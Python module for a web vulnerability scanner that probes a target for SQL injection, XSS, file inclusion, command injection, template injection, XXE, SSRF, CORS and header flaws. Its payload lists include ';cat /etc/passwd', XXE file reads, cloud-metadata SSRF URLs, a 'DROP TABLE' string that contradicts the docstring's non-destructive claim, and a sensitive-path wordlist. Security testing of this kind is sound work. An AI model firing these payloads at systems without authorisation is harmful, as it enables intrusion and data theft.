"""
Web Vulnerability Scanner — Module 6.

Tests a target URL for common web vulnerabilities:
  - Security headers audit
  - Cookie flags (Secure, HttpOnly, SameSite)
  - SQL injection (error-based and time-based indicators)
  - Cross-Site Scripting (reflected XSS)
  - Local File Inclusion (path traversal)
  - CSRF (missing anti-CSRF tokens)
  - Directory bruteforce (common sensitive paths)
  - Open redirects

Uses requests library for HTTP. All payloads are benign canary strings — not destructive.
"""
import time
import logging
import threading
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger("ids_ips")

_TIMEOUT = 8
_MAX_THREADS = 10

# ── Payloads ──────────────────────────────────────────────────────────────────

_SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' AND 1=1--", "1' AND 1=2--", "' OR 1=1#",
    "admin'--", "' OR 'x'='x", "1; DROP TABLE users--",
    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
    "1 AND SLEEP(0)--", "1 OR SLEEP(0)--",
]

_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\" onmouseover=\"alert(1)",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
]

_LFI_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd", "..%2F..%2Fetc%2Fpasswd",
    "..\\..\\windows\\win.ini", "..\\windows\\system32\\drivers\\etc\\hosts",
    "/etc/passwd", "/etc/shadow", "C:\\windows\\win.ini",
    "%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
]

_CMDI_PAYLOADS = [
    ";id", "&&id", "||id", "`id`", "$(id)",
    ";whoami", "&&whoami", "|whoami",
    ";cat /etc/passwd", "&&cat /etc/passwd",
    "; ping -c 1 127.0.0.1", "& ping -n 1 127.0.0.1 &",
    ";echo CMDI_TEST", "&&echo CMDI_TEST",
]
_CMDI_SIGNATURES = [
    "uid=", "root:", "www-data", "apache", "nobody", "daemon", "SYSTEM",
    "Windows NT", "Microsoft Windows", "cmdi_test",
]

_SSTI_PAYLOADS = [
    "{{7*7}}",          # Jinja2, Twig
    "${7*7}",           # FreeMarker, Velocity, Spring EL
    "#{7*7}",           # Ruby Thymeleaf
    "<%= 7*7 %>",       # ERB, JSP
    "${7*'7'}",         # Twig specific
    "{{7*'7'}}",        # Jinja2 specific
    "{7*7}",            # some engines
    "@(7*7)",           # Razor .NET
]
_SSTI_SIGNATURES = ["49", "49.0", "7777777"]  # 7*7=49, "7"*7="7777777"

_XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
]
_XXE_SIGNATURES = ["root:x:", "[boot loader]", "localhost", "127.0.0.1"]

_SSRF_PARAMS = ["url", "uri", "src", "source", "target", "dest", "destination",
                "redirect", "path", "host", "endpoint", "callback", "fetch",
                "load", "open", "image", "file", "proxy", "forward"]
_SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://2130706433/",   # 127.0.0.1 decimal
]
_SSRF_SIGNATURES = [
    "ami-id", "instance-id", "hostname", "local-hostname",
    "iam", "meta-data", "connection refused", "localhost",
]

_OPEN_REDIRECT_PAYLOADS = [
    "//evil.com", "https://evil.com", "//evil.com/%2f..",
    "https://evil.com?", "https://google.com",
]

_DIR_WORDLIST = [
    "admin", "administrator", "login", "panel", "dashboard", "config",
    ".env", ".git", ".git/config", "backup", "backup.zip", "db.sql",
    "phpinfo.php", "info.php", "wp-admin", "wp-login.php", "wp-config.php",
    "xmlrpc.php", "api", "api/v1", "api/v2", "swagger", "swagger-ui",
    "swagger.json", "openapi.json", "graphql", ".htaccess", ".htpasswd",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "web.config",
    "server-status", "server-info", "elmah.axd", "trace.axd",
    "adminer.php", "phpmyadmin", "pma", "mysql", "database",
    "test", "temp", "tmp", "logs", "log", "debug", "console",
    "actuator", "actuator/env", "actuator/health", "actuator/mappings",
    "metrics", "health", "status", "ping", "version",
    "shell", "sh", "cmd", "exec", "system", "upload", "uploads",
    "files", "static", "assets", "media", "images", "include",
    "includes", "lib", "libs", "vendor", "node_modules",
    "package.json", "composer.json", "requirements.txt", "Gemfile",
    ".DS_Store", "thumbs.db", "desktop.ini",
    "cgi-bin", "cgi-bin/env.cgi", "cgi-bin/test.cgi",
    "webdav", "dav", "git/HEAD", ".svn", ".svn/entries",
    "old", "bak", "backup.sql", "dump.sql", "data.sql",
]

_SEC_HEADERS_REQUIRED = {
    "strict-transport-security": "HSTS missing — no HTTPS enforcement",
    "content-security-policy": "CSP missing — XSS not mitigated",
    "x-frame-options": "X-Frame-Options missing — clickjacking possible",
    "x-content-type-options": "X-Content-Type-Options missing — MIME sniffing possible",
    "referrer-policy": "Referrer-Policy missing — referrer leakage possible",
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _session():
    try:
        import requests
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Security Scanner; compatible)",
        })
        return s
    except ImportError:
        return None


def _get(session, url: str, params: dict = None) -> tuple:
    """Returns (response, elapsed_ms) or (None, 0) on failure."""
    try:
        t0 = time.time()
        r = session.get(url, params=params, timeout=_TIMEOUT,
                        allow_redirects=False, verify=False)
        return r, (time.time() - t0) * 1000
    except Exception:
        return None, 0


def _post(session, url: str, data: dict) -> tuple:
    try:
        t0 = time.time()
        r = session.post(url, data=data, timeout=_TIMEOUT,
                         allow_redirects=False, verify=False)
        return r, (time.time() - t0) * 1000
    except Exception:
        return None, 0


def _inject_param(url: str, param: str, value: str) -> str:
    """Replace a query param value in URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


# ── Individual checks ─────────────────────────────────────────────────────────

def check_headers(session, url: str) -> dict:
    resp, _ = _get(session, url)
    if resp is None:
        return {"error": "cannot reach target"}

    findings = []
    headers_lower = {k.lower(): v for k, v in resp.headers.items()}

    # Required headers
    for h, msg in _SEC_HEADERS_REQUIRED.items():
        if h not in headers_lower:
            findings.append({"type": "MISSING_HEADER", "header": h,
                              "message": msg, "severity": "MEDIUM"})

    # Cookie flags
    for cookie in resp.cookies:
        issues = []
        if not cookie.secure:
            issues.append("Secure flag missing")
        if not cookie.has_nonstandard_attr("HttpOnly") and "httponly" not in str(cookie._rest).lower():
            issues.append("HttpOnly flag missing")
        if not cookie.has_nonstandard_attr("SameSite") and "samesite" not in str(cookie._rest).lower():
            issues.append("SameSite flag missing")
        if issues:
            findings.append({
                "type": "INSECURE_COOKIE",
                "cookie": cookie.name,
                "message": f"Cookie '{cookie.name}': {', '.join(issues)}",
                "severity": "LOW",
            })

    # Server / X-Powered-By info disclosure
    for h in ("server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"):
        if h in headers_lower:
            findings.append({
                "type": "INFO_DISCLOSURE",
                "header": h,
                "value": headers_lower[h],
                "message": f"Header '{h}' discloses server info: {headers_lower[h]}",
                "severity": "LOW",
            })

    return {
        "check": "headers",
        "url": url,
        "status_code": resp.status_code,
        "findings": findings,
        "all_headers": dict(resp.headers),
    }


def check_sqli(session, url: str) -> dict:
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params:
        return {"check": "sqli", "url": url, "findings": [],
                "info": "no GET parameters found to test"}

    findings = []
    error_signatures = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlstate",
        "unclosed quotation", "sqlite_", "syntax error", "microsoft sql",
        "jdbc", "db2 sql", "error in your sql",
    ]

    for param in params[:5]:
        for payload in _SQLI_PAYLOADS[:8]:
            test_url = _inject_param(url, param, payload)
            resp, elapsed = _get(session, test_url)
            if resp is None:
                continue
            body_lower = resp.text.lower() if hasattr(resp, "text") else ""
            for sig in error_signatures:
                if sig in body_lower:
                    findings.append({
                        "type": "SQLI_ERROR_BASED",
                        "param": param,
                        "payload": payload,
                        "signature": sig,
                        "message": f"Possible SQLi in param '{param}' — DB error signature '{sig}' found",
                        "severity": "HIGH",
                    })
                    break

    return {"check": "sqli", "url": url, "findings": findings}


def check_xss(session, url: str) -> dict:
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params:
        return {"check": "xss", "url": url, "findings": [],
                "info": "no GET parameters found to test"}

    findings = []
    for param in params[:5]:
        for payload in _XSS_PAYLOADS[:6]:
            test_url = _inject_param(url, param, payload)
            resp, _ = _get(session, test_url)
            if resp is None:
                continue
            if payload in (resp.text if hasattr(resp, "text") else ""):
                findings.append({
                    "type": "XSS_REFLECTED",
                    "param": param,
                    "payload": payload,
                    "message": f"Reflected XSS in param '{param}' — payload echoed in response",
                    "severity": "HIGH",
                })

    return {"check": "xss", "url": url, "findings": findings}


def check_lfi(session, url: str) -> dict:
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params:
        return {"check": "lfi", "url": url, "findings": [],
                "info": "no GET parameters found to test"}

    findings = []
    lfi_signatures = ["root:x:", "[boot loader]", "[fonts]", "for 16-bit app support"]

    for param in params[:3]:
        for payload in _LFI_PAYLOADS[:8]:
            test_url = _inject_param(url, param, payload)
            resp, _ = _get(session, test_url)
            if resp is None:
                continue
            body = resp.text.lower() if hasattr(resp, "text") else ""
            for sig in lfi_signatures:
                if sig in body:
                    findings.append({
                        "type": "LFI",
                        "param": param,
                        "payload": payload,
                        "signature": sig,
                        "message": f"LFI in param '{param}' — file content signature '{sig}' found",
                        "severity": "CRITICAL",
                    })
                    break

    return {"check": "lfi", "url": url, "findings": findings}


def check_open_redirect(session, url: str) -> dict:
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    redirect_params = [p for p in params if any(k in p.lower()
                        for k in ("redirect", "url", "next", "return", "goto", "redir", "dest"))]
    if not redirect_params:
        return {"check": "open_redirect", "url": url, "findings": [],
                "info": "no redirect parameters found"}

    findings = []
    for param in redirect_params[:3]:
        for payload in _OPEN_REDIRECT_PAYLOADS[:3]:
            test_url = _inject_param(url, param, payload)
            resp, _ = _get(session, test_url)
            if resp is None:
                continue
            loc = resp.headers.get("Location", "")
            if "evil.com" in loc or ("google.com" in payload and "google.com" in loc):
                findings.append({
                    "type": "OPEN_REDIRECT",
                    "param": param,
                    "payload": payload,
                    "location": loc,
                    "message": f"Open redirect via '{param}' — redirects to {loc}",
                    "severity": "MEDIUM",
                })

    return {"check": "open_redirect", "url": url, "findings": findings}


def check_csrf(session, url: str) -> dict:
    """Heuristic: POST endpoints without CSRF token in form are potentially vulnerable."""
    resp, _ = _get(session, url)
    if resp is None:
        return {"check": "csrf", "url": url, "findings": []}

    body = resp.text if hasattr(resp, "text") else ""
    findings = []
    import re
    forms = re.findall(r'<form[^>]*method=["\']?post["\']?[^>]*>(.*?)</form>',
                       body, re.IGNORECASE | re.DOTALL)
    for form in forms:
        has_csrf = any(tok in form.lower() for tok in
                       ("csrf", "token", "_token", "nonce", "authenticity"))
        if not has_csrf:
            findings.append({
                "type": "CSRF_MISSING_TOKEN",
                "message": "POST form found without CSRF token",
                "severity": "MEDIUM",
            })

    return {"check": "csrf", "url": url, "findings": findings}


def check_cmdi(session, url: str) -> dict:
    """Test for OS command injection in GET parameters."""
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params:
        return {"check": "cmdi", "url": url, "findings": [],
                "info": "no GET parameters found to test"}

    findings = []
    for param in params[:4]:
        for payload in _CMDI_PAYLOADS[:8]:
            test_url = _inject_param(url, param, payload)
            resp, elapsed = _get(session, test_url)
            if resp is None:
                continue
            body_lower = resp.text.lower() if hasattr(resp, "text") else ""
            for sig in _CMDI_SIGNATURES:
                if sig.lower() in body_lower:
                    findings.append({
                        "type": "CMD_INJECTION",
                        "param": param,
                        "payload": payload,
                        "signature": sig,
                        "message": f"Possible command injection in '{param}' — signature '{sig}' in response",
                        "severity": "CRITICAL",
                    })
                    break
    return {"check": "cmdi", "url": url, "findings": findings}


def check_ssti(session, url: str) -> dict:
    """Test for Server-Side Template Injection."""
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params:
        return {"check": "ssti", "url": url, "findings": [],
                "info": "no GET parameters found to test"}

    findings = []
    for param in params[:4]:
        for payload in _SSTI_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            resp, _ = _get(session, test_url)
            if resp is None:
                continue
            body = resp.text if hasattr(resp, "text") else ""
            for sig in _SSTI_SIGNATURES:
                if sig in body:
                    findings.append({
                        "type": "SSTI",
                        "param": param,
                        "payload": payload,
                        "signature": sig,
                        "message": f"SSTI in '{param}' — expression {payload!r} evaluated to {sig!r}",
                        "severity": "CRITICAL",
                    })
                    break
    return {"check": "ssti", "url": url, "findings": findings}


def check_xxe(session, url: str) -> dict:
    """Test for XML External Entity injection via POST with XML content-type."""
    findings = []
    for payload in _XXE_PAYLOADS[:2]:
        try:
            t0 = time.time()
            resp = session.post(url, data=payload,
                                headers={"Content-Type": "application/xml"},
                                timeout=_TIMEOUT, allow_redirects=False, verify=False)
            body_lower = resp.text.lower() if hasattr(resp, "text") else ""
            for sig in _XXE_SIGNATURES:
                if sig.lower() in body_lower:
                    findings.append({
                        "type": "XXE",
                        "payload": payload[:80] + "...",
                        "signature": sig,
                        "message": f"Possible XXE — signature '{sig}' reflected in response to XML POST",
                        "severity": "CRITICAL",
                    })
                    break
        except Exception:
            pass
    return {"check": "xxe", "url": url, "findings": findings}


def check_ssrf(session, url: str) -> dict:
    """Test URL parameters for SSRF vulnerabilities."""
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    ssrf_params = [p for p in params if any(k in p.lower() for k in _SSRF_PARAMS)]

    if not ssrf_params:
        # Try all params if none match common SSRF names
        ssrf_params = params[:3]
    if not ssrf_params:
        return {"check": "ssrf", "url": url, "findings": [],
                "info": "no suitable parameters found"}

    findings = []
    for param in ssrf_params[:3]:
        for payload in _SSRF_PAYLOADS[:4]:
            test_url = _inject_param(url, param, payload)
            resp, elapsed = _get(session, test_url)
            if resp is None:
                continue
            # Status 200 or 500 with internal error may indicate SSRF
            body_lower = resp.text.lower() if hasattr(resp, "text") else ""
            for sig in _SSRF_SIGNATURES:
                if sig.lower() in body_lower:
                    findings.append({
                        "type": "SSRF",
                        "param": param,
                        "payload": payload,
                        "signature": sig,
                        "message": f"Possible SSRF in '{param}' with {payload} — internal signature '{sig}' leaked",
                        "severity": "HIGH",
                    })
                    break
            # Heuristic: if 127.0.0.1 payload returns 200 with substantial body
            if ("127.0.0.1" in payload or "localhost" in payload) and resp.status_code == 200 and len(resp.content) > 200:
                if not any(f["param"] == param and f["payload"] == payload for f in findings):
                    findings.append({
                        "type": "SSRF_POSSIBLE",
                        "param": param,
                        "payload": payload,
                        "message": f"Possible SSRF — localhost request returned {resp.status_code} with {len(resp.content)} bytes",
                        "severity": "MEDIUM",
                    })
    return {"check": "ssrf", "url": url, "findings": findings}


def check_dirbrute(session, base_url: str, wordlist: list = None) -> dict:
    words = wordlist or _DIR_WORDLIST
    base = base_url.rstrip("/")
    findings = []
    lock = threading.Lock()

    def probe(path: str):
        test_url = f"{base}/{path}"
        resp, _ = _get(session, test_url)
        if resp is None:
            return
        if resp.status_code in (200, 301, 302, 403):
            with lock:
                findings.append({
                    "type": "PATH_FOUND",
                    "path": f"/{path}",
                    "url": test_url,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "message": f"Path /{path} returned HTTP {resp.status_code}",
                    "severity": "LOW" if resp.status_code == 403 else "MEDIUM",
                })

    threads = []
    for word in words:
        t = threading.Thread(target=probe, args=(word,), daemon=True)
        threads.append(t)
        if len(threads) >= _MAX_THREADS:
            for th in threads:
                th.start()
            for th in threads:
                th.join(timeout=_TIMEOUT + 2)
            threads = []

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=_TIMEOUT + 2)

    return {"check": "dirbrute", "url": base_url, "paths_tested": len(words),
            "findings": sorted(findings, key=lambda x: x["status"])}


# ── Full scan orchestrator ────────────────────────────────────────────────────

def full_scan(url: str, checks: list = None) -> dict:
    """
    Run all (or selected) vulnerability checks against url.
    checks: list of check names, e.g. ['headers', 'sqli', 'xss']
    Returns combined report.
    """
    import warnings
    warnings.filterwarnings("ignore")  # suppress InsecureRequestWarning

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    session = _session()
    if session is None:
        return {"error": "requests library not installed"}

    all_checks = checks or ["headers", "sqli", "xss", "lfi", "open_redirect",
                             "csrf", "dirbrute", "cmdi", "ssti", "xxe", "ssrf",
                             "graphql", "cors", "subdomain_takeover", "host_header_injection"]

    results = {
        "url": url,
        "timestamp": time.time(),
        "checks_run": [],
        "findings": [],
        "summary": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0},
    }

    check_fn = {
        "headers": check_headers,
        "sqli": check_sqli,
        "xss": check_xss,
        "lfi": check_lfi,
        "open_redirect": check_open_redirect,
        "csrf": check_csrf,
        "dirbrute": check_dirbrute,
        "cmdi": check_cmdi,
        "ssti": check_ssti,
        "xxe": check_xxe,
        "ssrf": check_ssrf,
        "graphql": check_graphql,
        "cors": check_cors,
        "subdomain_takeover": check_subdomain_takeover,
        "host_header_injection": check_host_header_injection,
    }

    for name in all_checks:
        fn = check_fn.get(name)
        if fn is None:
            continue
        try:
            r = fn(session, url)
            results["checks_run"].append(name)
            for f in r.get("findings", []):
                results["findings"].append({**f, "check": name})
                sev = f.get("severity", "LOW")
                results["summary"][sev] = results["summary"].get(sev, 0) + 1
            # Store per-check result for detail view
            results[name] = r
        except Exception as e:
            results[name] = {"error": str(e)}

    results["risk_score"] = (
        results["summary"].get("CRITICAL", 0) * 40 +
        results["summary"].get("HIGH", 0) * 20 +
        results["summary"].get("MEDIUM", 0) * 8 +
        results["summary"].get("LOW", 0) * 2
    )

    db = _db()
    if db:
        try:
            db.save_vuln_scan(url, results)
        except Exception:
            pass

    return results


def check_graphql(session, url: str) -> dict:
    """Send GraphQL introspection query and detect if schema is exposed."""
    import re as _re
    gql_url = url.rstrip("/")
    # Try common GraphQL endpoints
    endpoints_to_try = [gql_url]
    for suffix in ("/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"):
        if not gql_url.endswith(suffix):
            from urllib.parse import urlparse as _up
            parsed = _up(gql_url)
            endpoints_to_try.append(f"{parsed.scheme}://{parsed.netloc}{suffix}")

    introspection_query = '{"query":"{__schema{types{name}}}"}'
    findings = []

    for ep in endpoints_to_try[:4]:
        try:
            resp = session.post(
                ep,
                data=introspection_query,
                headers={"Content-Type": "application/json"},
                timeout=_TIMEOUT,
                verify=False,
                allow_redirects=False,
            )
            if resp.status_code in (200, 201) and "types" in resp.text and "__schema" in resp.text:
                try:
                    import json
                    data = json.loads(resp.text)
                    types = data.get("data", {}).get("__schema", {}).get("types", [])
                    type_names = [t.get("name") for t in types if t.get("name") and not t["name"].startswith("__")]
                except Exception:
                    type_names = []
                findings.append({
                    "type": "GRAPHQL_INTROSPECTION_EXPOSED",
                    "endpoint": ep,
                    "exposed_types": type_names[:20],
                    "message": f"GraphQL introspection enabled at {ep} — schema fully exposed ({len(type_names)} types)",
                    "severity": "MEDIUM",
                })
                break
        except Exception:
            continue

    return {"check": "graphql", "url": url, "findings": findings}


def check_cors(session, url: str) -> dict:
    """Test CORS misconfiguration — does server reflect arbitrary Origin?"""
    origins_to_test = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        f"https://x.{urlparse(url).netloc}",
    ]
    findings = []

    for origin in origins_to_test:
        try:
            resp = session.get(
                url,
                headers={"Origin": origin},
                timeout=_TIMEOUT,
                verify=False,
                allow_redirects=True,
            )
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                findings.append({
                    "type": "CORS_WILDCARD",
                    "origin_sent": origin,
                    "acao": acao,
                    "message": "CORS Access-Control-Allow-Origin: * (wildcard) — credentials not allowed but any origin can read responses",
                    "severity": "LOW",
                })
            elif acao == origin and origin != "null":
                severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                findings.append({
                    "type": "CORS_ORIGIN_REFLECTED",
                    "origin_sent": origin,
                    "acao": acao,
                    "acac": acac,
                    "message": f"CORS reflects arbitrary origin {origin!r}"
                               + (" WITH credentials! (CRITICAL)" if acac.lower() == "true" else ""),
                    "severity": "CRITICAL" if acac.lower() == "true" else severity,
                })
                break
            elif acao == "null":
                findings.append({
                    "type": "CORS_NULL_ORIGIN",
                    "origin_sent": origin,
                    "acao": acao,
                    "message": "CORS allows null origin — exploitable via sandboxed iframes",
                    "severity": "MEDIUM",
                })
        except Exception:
            continue

    return {"check": "cors", "url": url, "findings": findings}


def check_subdomain_takeover(session, url: str) -> dict:
    """
    Check for dangling CNAMEs on the target domain and its subdomains.
    Indicators of takeover-prone hosting providers.
    """
    import socket, re as _re
    from urllib.parse import urlparse as _up

    _TAKEOVER_FINGERPRINTS = [
        ("github", "There isn't a GitHub Pages site here"),
        ("heroku", "No such app"),
        ("shopify", "Sorry, this shop is currently unavailable"),
        ("fastly", "Fastly error: unknown domain"),
        ("zendesk", "Help Center Closed"),
        ("tumblr", "There's nothing here"),
        ("wordpress", "Do you want to register"),
        ("ghost", "The thing you were looking for is no longer here"),
        ("bitbucket", "Repository not found"),
        ("s3", "NoSuchBucket"),
        ("azure", "404 Web Site not found"),
    ]

    parsed = _up(url)
    domain = parsed.netloc

    findings = []
    # Check CNAME for the main domain
    try:
        import dns.resolver
        try:
            cname_answer = dns.resolver.resolve(domain, "CNAME")
            for rdata in cname_answer:
                cname_target = str(rdata.target).rstrip(".")
                # Check response of CNAME target
                try:
                    resp = session.get(url, timeout=_TIMEOUT, verify=False)
                    for provider, fingerprint in _TAKEOVER_FINGERPRINTS:
                        if fingerprint.lower() in resp.text.lower():
                            findings.append({
                                "type": "SUBDOMAIN_TAKEOVER",
                                "domain": domain,
                                "cname": cname_target,
                                "provider": provider,
                                "message": f"Subdomain takeover possible: {domain} → {cname_target} ({provider}) shows takeover fingerprint",
                                "severity": "CRITICAL",
                            })
                except Exception:
                    pass
        except Exception:
            pass
    except ImportError:
        # Fallback without dnspython — just check response fingerprints
        try:
            resp = session.get(url, timeout=_TIMEOUT, verify=False)
            for provider, fingerprint in _TAKEOVER_FINGERPRINTS:
                if fingerprint.lower() in resp.text.lower():
                    findings.append({
                        "type": "SUBDOMAIN_TAKEOVER_POSSIBLE",
                        "domain": domain,
                        "provider": provider,
                        "message": f"Takeover fingerprint for {provider} found at {url}",
                        "severity": "HIGH",
                    })
        except Exception:
            pass

    return {"check": "subdomain_takeover", "url": url, "findings": findings}


def check_host_header_injection(session, url: str) -> dict:
    """Inject malicious Host headers and check if they are reflected."""
    evil_hosts = [
        "evil.com",
        "evil.com:80",
        "evil.com:443",
        "evil.com:8080",
    ]
    findings = []

    for evil_host in evil_hosts:
        try:
            resp = session.get(
                url,
                headers={"Host": evil_host, "X-Forwarded-Host": evil_host},
                timeout=_TIMEOUT,
                verify=False,
                allow_redirects=False,
            )
            body = resp.text if hasattr(resp, "text") else ""
            headers_str = str(dict(resp.headers))
            if "evil.com" in body or "evil.com" in headers_str:
                in_body = "evil.com" in body
                in_redirect = "evil.com" in resp.headers.get("Location", "")
                findings.append({
                    "type": "HOST_HEADER_INJECTION",
                    "injected_host": evil_host,
                    "reflected_in_body": in_body,
                    "reflected_in_redirect": in_redirect,
                    "message": f"Host header injection: {evil_host!r} reflected in {'body' if in_body else 'redirect'}",
                    "severity": "HIGH",
                })
                break
        except Exception:
            continue

    return {"check": "host_header_injection", "url": url, "findings": findings}


# ── Full scan orchestrator ─────────────────────────────────────────────────────

def _db():
    try:
        from db.database import Database
        return Database.get()
    except Exception:
        return None
